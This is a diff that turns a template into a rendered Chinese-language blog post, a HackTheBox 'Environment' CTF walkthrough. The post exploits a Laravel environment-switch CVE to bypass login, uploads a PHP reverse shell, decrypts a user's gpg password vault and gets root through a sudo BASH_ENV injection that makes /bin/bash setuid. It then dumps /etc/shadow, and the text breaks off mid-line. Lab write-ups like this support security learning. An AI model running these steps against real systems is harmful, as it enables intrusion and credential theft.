@@ -1,20 +1,351 @@
-extends partial/layout.pug
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 nmap123456789101112131415">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox——HTB Environment Writeup">
+<meta property="og:url" content="https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/index.html">
+<meta property="og:site_name" content="N0nome&#96;s Fucking Life">
+<meta property="og:description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 nmap123456789101112131415">
+<meta property="og:locale">
+<meta property="og:image" content="https://n0nome.github.io/images/environment.png">
+<meta property="og:image" content="https://n0nome.github.io/images/environment-1.png">
+<meta property="og:image" content="https://n0nome.github.io/images/environment-2.png">
+<meta property="og:image" content="https://n0nome.github.io/images/environment-3.png">
+<meta property="og:image" content="https://n0nome.github.io/images/environment-4.png">
+<meta property="og:image" content="https://n0nome.github.io/images/environment-5.png">
+<meta property="og:image" content="https://n0nome.github.io/images/environment-6.png">
+<meta property="og:image" content="https://n0nome.github.io/images/environment-7.png">
+<meta property="og:image" content="https://n0nome.github.io/images/environment-8.png">
+<meta property="og:image" content="https://n0nome.github.io/images/environment-9.png">
+<meta property="og:image" content="https://n0nome.github.io/images/environment-10.png">
+<meta property="og:image" content="https://n0nome.github.io/images/environment-11.png">
+<meta property="og:image" content="https://n0nome.github.io/images/environment-12.png">
+<meta property="og:image" content="https://n0nome.github.io/images/environment-13.png">
+<meta property="og:image" content="https://n0nome.github.io/images/environment-14.png">
+<meta property="og:image" content="https://n0nome.github.io/images/environment-15.png">
+<meta property="og:image" content="https://n0nome.github.io/images/environment-16.png">
+<meta property="article:published_time" content="2025-06-19T13:59:05.043Z">
+<meta property="article:modified_time" content="2025-06-20T02:23:06.536Z">
+<meta property="article:author" content="n0nome">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://n0nome.github.io/images/environment.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox——HTB Environment Writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
 
-block site_title
-    != page.title + ' • ' + config.title
 
-block description
-    - var desc = page.desc || page.title + ' - ' + config.author;
-    meta(name='description', content=desc)
+    <!-- Umami Analytics -->
 
-block container
-    include mixins/post.pug
-    +post(page)
 
-block pagination
-    include mixins/paginator.pug
-    +post()
-    include partial/comment.pug
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
 
-block copyright
-    include partial/copyright.pug
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/06/19/ElectricBreeze-1/ElectricBreeze-1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/&text=HackTheBox——HTB Environment Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/&title=HackTheBox——HTB Environment Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/&is_video=false&description=HackTheBox——HTB Environment Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox——HTB Environment Writeup&body=Check out this article: https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/&title=HackTheBox——HTB Environment Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/&title=HackTheBox——HTB Environment Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/&title=HackTheBox——HTB Environment Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/&title=HackTheBox——HTB Environment Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/&name=HackTheBox——HTB Environment Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/&t=HackTheBox——HTB Environment Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-number">1.</span> <span class="toc-text">nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">1.1.</span> <span class="toc-text">web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-52301"><span class="toc-number">1.2.</span> <span class="toc-text">CVE-2024-52301</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#upload-php-reverse-shell-and-bypass"><span class="toc-number">1.3.</span> <span class="toc-text">upload php reverse shell and bypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-www-data"><span class="toc-number">2.</span> <span class="toc-text">shell as www-data</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#database-sqlite-rabbit-hole"><span class="toc-number">2.1.</span> <span class="toc-text">database.sqlite rabbit hole</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gpg-decrypt"><span class="toc-number">2.2.</span> <span class="toc-text">gpg decrypt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-hish"><span class="toc-number">3.</span> <span class="toc-text">shell as hish</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hashes"><span class="toc-number">4.</span> <span class="toc-text">Hashes</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox——HTB Environment Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">n0nome</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-19T13:59:05.043Z" class="dt-published" itemprop="datePublished">2025-06-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/writeup/" rel="tag">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
+<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><img src="/images/environment.png"></p>
+<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 5c:02:33:95:ef:44:e2:80:<span class="built_in">cd</span>:3a:96:02:23:f1:92:64 (ECDSA)</span><br><span class="line">|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.22.1</span><br><span class="line">|_http-server-header: nginx/1.22.1</span><br><span class="line">|_http-title: Did not follow redirect to http://environment.htb</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+<p>这个吧唧可能存在waf，nmap扫的时候可以加一点<code>-Pn -D RND:5</code><br><code>好吧，没有waf，纯是我的代理问题</code><br>把域名加到hosts里面</p>
+<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p><img src="/images/environment-1.png"><br>平平无奇<br>扫一下目录和子域<br>子域没扫出来<br>目录倒是扫出来一点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[14:39:44] 301 -  169B  - /build  -&gt;  http://environment.htb/build/</span><br><span class="line">[14:40:29] 200 -    0B  - /favicon.ico</span><br><span class="line">[14:40:54] 200 -    2KB - /index.php/login/</span><br><span class="line">[14:41:06] 200 -    2KB - /login</span><br><span class="line">[14:41:06] 200 -    2KB - /login/</span><br><span class="line">[14:41:08] 302 -  358B  - /logout  -&gt;  http://environment.htb/login</span><br><span class="line">[14:41:09] 302 -  358B  - /logout/  -&gt;  http://environment.htb/login</span><br><span class="line">[14:42:02] 200 -   24B  - /robots.txt</span><br><span class="line">[14:42:32] 301 -  169B  - /storage  -&gt;  http://environment.htb/storage/</span><br><span class="line">[14:42:44] 405 -  245KB - /upload</span><br><span class="line">[14:42:44] 405 -  245KB - /upload/</span><br></pre></td></tr></table></figure>
+<p><img src="/images/environment-2.png"><br>robots没啥，有一个login和upload<br><img src="/images/environment-3.png"><br>看来只能上burp了<br><img src="/images/environment-4.png"><br>上来就两个cookie<br><img src="/images/environment-5.png"><br>对登录页POST一下发现body里面有一个remember的key，应该是bool的形式，改一下试试<br><img src="/images/environment-6.png"><br>改成true之后会出现server error的页面，看提示是Laravel的，找一下有没有相关的exploit<br>另外，他的页面上也给了一点提示</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span>(<span class="variable">$keep_loggedin</span> !== False) &#123;</span><br><span class="line">    // TODO: Keep user logged <span class="keyword">in</span> <span class="keyword">if</span> he selects <span class="string">&quot;Remember Me?&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(App::environment() == <span class="string">&quot;preprod&quot;</span>) &#123; //QOL: login directly as me <span class="keyword">in</span> dev/local/preprod envs</span><br><span class="line">        <span class="variable">$request</span>-&gt;session()-&gt;regenerate();</span><br><span class="line">        <span class="variable">$request</span>-&gt;session()-&gt;put(<span class="string">&#x27;user_id&#x27;</span>, 1);</span><br><span class="line">        <span class="built_in">return</span> redirect(<span class="string">&#x27;/management/dashboard&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$user</span> = User::<span class="built_in">where</span>(<span class="string">&#x27;email&#x27;</span>, <span class="variable">$email</span>)-&gt;first();</span><br><span class="line"></span><br><span class="line">这段代码检查当前应用程序运行的环境是否为 preprod（预生产环境）。App::environment() 是 Laravel 提供的方法，用于获取当前环境（例如 <span class="built_in">local</span>、dev、preprod、production）。</span><br><span class="line">如果当前环境是 preprod，执行以下操作：</span><br><span class="line"><span class="variable">$request</span>-&gt;session()-&gt;regenerate();: 重新生成会话 ID，以防止会话固定攻击（session fixation）。</span><br><span class="line"><span class="variable">$request</span>-&gt;session()-&gt;put(<span class="string">&#x27;user_id&#x27;</span>, 1);: 在会话中存储 user_id 为 1，相当于直接将用户 ID 为 1 的用户标记为已登录。</span><br><span class="line"><span class="built_in">return</span> redirect(<span class="string">&#x27;/management/dashboard&#x27;</span>);: 将用户重定向到 /management/dashboard 页面（可能是管理仪表板）。</span><br></pre></td></tr></table></figure>
+<p>那顺便找一下如何进入到preprod环境</p>
+<h3 id="CVE-2024-52301"><a href="#CVE-2024-52301" class="headerlink" title="CVE-2024-52301"></a>CVE-2024-52301</h3><p>可以翻到官方文档中的<a target="_blank" rel="noopener" href="https://laravel.com/docs/12.x/configuration">configuration</a>，和一个<a target="_blank" rel="noopener" href="https://github.com/Nyamort/CVE-2024-52301">CVE</a>，利用一下试试<br><img src="/images/environment-7.png"><br><img src="/images/environment-8.png"><br>ok，i got it</p>
+<h3 id="upload-php-reverse-shell-and-bypass"><a href="#upload-php-reverse-shell-and-bypass" class="headerlink" title="upload php reverse shell and bypass"></a>upload php reverse shell and bypass</h3><p>翻了一下，简单的没有，只有profile有用一点，有一个upload的地方，正好扫目录的时候出现upload<br><img src="/images/environment-9.png"><br>传一下试试<br><img src="/images/environment-10.png"><br>传不了php，改一下<br>经过测试发现限制还挺多<br><img src="/images/environment-11.png"><br><strong>如果选择上传jpeg的话，他会提示”message”:”Unexpected MimeType: application/octet-stream”</strong>，很奇怪<br>访问一下上传的文件<br><img src="/images/environment-12.png"><br>got it</p>
+<h2 id="shell-as-www-data"><a href="#shell-as-www-data" class="headerlink" title="shell as www-data"></a>shell as www-data</h2><p>shell可能容易断，多弹几次<br>在文件夹里遨游一下</p>
+<h3 id="database-sqlite-rabbit-hole"><a href="#database-sqlite-rabbit-hole" class="headerlink" title="database.sqlite rabbit hole"></a>database.sqlite rabbit hole</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@environment:~/app/database$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">database.sqlite  database.sqlite-journal  factories  migrations  seeders</span><br></pre></td></tr></table></figure>
+<p>有一个数据库，nc传过来<br><img src="/images/environment-13.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Bethany	bethany@environment.htb		$2y$12<span class="variable">$6kbg21YDMaGrt</span>.iCUkP/s.yLEGAE2S78gWt.6MAODUD3JXFMS13J.</span><br><span class="line">Hish	hish@environment.htb		$2y$12<span class="variable">$QPbeVM</span>.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi</span><br><span class="line">Jono	jono@environment.htb		$2y$12<span class="variable">$i</span>.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm</span><br></pre></td></tr></table></figure>
+<p>crack一下<br>不好，上当了，又是解不出来的<br>接着翻。。。<br>怎么回事，翻到了什么<br><img src="/images/environment-14.png"><br>好吧，在hish家里翻一翻</p>
+<h3 id="gpg-decrypt"><a href="#gpg-decrypt" class="headerlink" title="gpg decrypt"></a>gpg decrypt</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@environment:/home/hish/backup$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">keyvault.gpg</span><br></pre></td></tr></table></figure>
+<p>在backup下面有一个gpg文件，传过来<br>gpg2john crack hash and 。。。<br>然后就会发现解不出这个hash，淦，又在欺骗<br>家里边没有.ssh，但是有一个.gnupg，利用一下吧<br>先看下刚刚那个怎么加密</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@environment:/home/hish$ gpg --list-packets backup/keyvault.gpg</span><br><span class="line">gpg --list-packets backup/keyvault.gpg</span><br><span class="line">gpg: Fatal: can<span class="string">&#x27;t create directory &#x27;</span>/var/www/.gnupg<span class="string">&#x27;: Permission denied</span></span><br></pre></td></tr></table></figure>
+<p>当前目录还看不了<br>给他换个地方指定一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">www-data@environment:/home/hish$ gpg --homedir=/tmp --list-packets /tmp/keyvault.gpg</span><br><span class="line">&lt;gpg --homedir=/tmp --list-packets /tmp/keyvault.gpg</span><br><span class="line">gpg: encrypted with RSA key, ID B755B0EDD6CFCFD3</span><br><span class="line">gpg: decryption failed: No secret key</span><br><span class="line"><span class="comment"># off=0 ctb=85 tag=1 hlen=3 plen=268</span></span><br><span class="line">:pubkey enc packet: version 3, algo 1, keyid B755B0EDD6CFCFD3</span><br><span class="line">        data: [2046 bits]</span><br><span class="line"><span class="comment"># off=271 ctb=d2 tag=18 hlen=2 plen=157 new-ctb</span></span><br><span class="line">:encrypted data packet:</span><br><span class="line">        length: 157</span><br><span class="line">        mdc_method: 2</span><br></pre></td></tr></table></figure>
+<p>可以看到时RSA key加密，那正好有.gnupg，也给他来一下子</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">www-data@environment:/home/hish$ <span class="built_in">cp</span> -r /home/hish/.gnupg /tmp                          </span><br><span class="line"><span class="built_in">cp</span> -r /home/hish/.gnupg /tmp </span><br><span class="line"></span><br><span class="line"><span class="comment"># 导进去</span></span><br><span class="line">www-data@environment:/home/hish$ gpg --homedir=/tmp/.gnupg --list-secret-keys          </span><br><span class="line">gpg --homedir=/tmp/.gnupg --list-secret-keys</span><br><span class="line">gpg: WARNING: unsafe permissions on homedir <span class="string">&#x27;/tmp/.gnupg&#x27;</span></span><br><span class="line">/tmp/.gnupg/pubring.kbx      </span><br><span class="line">-----------------------                                                               </span><br><span class="line">sec   rsa2048 2025-01-11 [SC]                                                         </span><br><span class="line">      F45830DFB638E66CD8B752A012F42AE5117FFD8E</span><br><span class="line">uid           [ultimate] hish_ &lt;hish@environment.htb&gt;</span><br><span class="line">ssb   rsa2048 2025-01-11 [E]     </span><br><span class="line"></span><br><span class="line"><span class="comment"># 解出来</span></span><br><span class="line">www-data@environment:/home/hish$ gpg --homedir=/tmp/.gnupg --decrypt /tmp/keyvault.gpg </span><br><span class="line">&lt; --homedir=/tmp/.gnupg --decrypt /tmp/keyvault.gpg </span><br><span class="line">gpg: WARNING: unsafe permissions on homedir <span class="string">&#x27;/tmp/.gnupg&#x27;</span></span><br><span class="line">gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11</span><br><span class="line">      <span class="string">&quot;hish_ &lt;hish@environment.htb&gt;&quot;</span></span><br><span class="line">PAYPAL.COM -&gt; Ihaves0meMon<span class="variable">$yhere123</span></span><br><span class="line">ENVIRONMENT.HTB -&gt; marineSPm@ster!! &lt;-- password</span><br><span class="line">FACEBOOK.COM -&gt; summerSunnyB3ACH!!</span><br></pre></td></tr></table></figure>
+<p>有密码了，su一下可以登录hish用户</p>
+<h2 id="shell-as-hish"><a href="#shell-as-hish" class="headerlink" title="shell as hish"></a>shell as hish</h2><p><code>sudo -l</code>看一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">www-data@environment:/home/hish$ su hish</span><br><span class="line">su hish</span><br><span class="line">Password: marineSPm@ster!!</span><br><span class="line"></span><br><span class="line">hish@environment:~$ <span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> hish: marineSPm@ster!!</span><br><span class="line"></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> hish on environment:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,</span><br><span class="line">    env_keep+=<span class="string">&quot;ENV BASH_ENV&quot;</span>, use_pty</span><br><span class="line"></span><br><span class="line">User hish may run the following commands on environment:</span><br><span class="line">    (ALL) /usr/bin/systeminfo</span><br></pre></td></tr></table></figure>
+<p>oh ho可以看到有一个<code>ENV BASH_ENV</code>，可以进行一下命令注入，也可以问问gpt<br><img src="/images/environment-15.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;chmod 4777 /bin/bash&#x27;</span> &gt; /tmp/evil.sh</span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/evil.sh</span><br><span class="line"><span class="built_in">export</span> BASH_ENV=/tmp/evil.sh</span><br><span class="line"><span class="built_in">sudo</span> /usr/bin/systeminfo</span><br></pre></td></tr></table></figure>
+<p><img src="/images/environment-16.png"><br>got root</p>
+<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@environment:/home/hish# <span class="built_in">cat</span> /etc/shadow</span><br><span class="line">root:$y$j9T<span class="variable">$ri4ncGGOHy2ucyMf0</span>/wae1<span class="variable">$qfFOfsAj1qUCeQyGnjCYhdLQ9XqcCOBscht51lZEei1</span>:20094:0:99999:7:::</span><br><span class="line">daemon:*:20094:0:99999:7:::</span><br><span class="line">bin:*:20094:0:99999:7:::</span><br><span class="line">sys:*:20094:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:20094:0:99999:7:::</span><br><span class="line">games:*:20094:0:99999:7:::</span><br><span class="line">man:*:20094:0:99999:7:::</span><br><span class="line">lp:*:20094:0:99999:7:::</span><br><span class="line">mail:*:20094:0:99999:7:::</span><br><span class="line">news:*:20094:0:99999:7:::</span><br><span class="line">uucp:*:20094:0:99999:7:::</span><br><span class="line">proxy:*:20094:0:99999:7:::</span><br><span class="line">www-data:*:20094:0:99999:7:::</span><br><span class="line">backup:*:20094:0:99999:7:::</span><br><span class="line">list:*:20094:0:99999:7:::</span><br><span class="line">irc:*:20094:0:99999:7:::</span><br><span class="line">_apt:*:20094:0:99999:7:::</span><br><span class="line">nobody:*:20094:0:99999:7:::</span><br><span class="line">systemd-network:!*:20094::::::</span><br><span class="line">systemd-timesync:!*:20094::::::</span><br><span class="line">messagebus:!:20094::::::</span><br><span class="line">avahi-autoipd:!:20094::::::</span><br><span class="line">sshd:!:20094::::::</span><br><span class="line">hish:$y$j9T<span class="variable">$4I1ToSPTrzuz2EoDweHsP</span>/<span class="variable">$7rS9lhc9</span>.n/Hrx4r.bJ9KsKIpOaPDV0mj4pgLV2PF/7:20094:0:99999:7:::</span><br><span 